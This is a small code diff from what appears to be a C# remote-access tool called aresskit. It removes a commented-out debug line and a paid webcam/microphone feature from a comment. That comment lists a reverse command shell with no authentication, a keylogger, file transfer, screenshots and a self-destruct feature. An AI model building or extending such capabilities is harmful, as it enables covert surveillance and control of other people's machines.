@@ -96,7 +96,6 @@ namespace aresskit
                                             parameterArray[0] = parameterString;
                                         }
                                         output = Misc.byteCode(methodInstance.Invoke(classInstance, parameterArray).ToString() + "\n");
-                                        // Console.WriteLine(methodInstance.Invoke(classInstance, parameterArray).ToString() + "\n");
                                     }
                                 }
                             }
@@ -139,7 +138,6 @@ namespace aresskit
              * - Reverse Command Prompt Shell (minimalistic, no auth required)
              * - UDP/TCP Port Listener (similar to Netcat)
              * - File downloader/uploader
-             * - Live Cam/Mic Feed (extra-fee)
              * - Screenshot(s)
              * - Real-Time and Log-based Keylogger
              * - Self-destruct feature (protect your privacy)
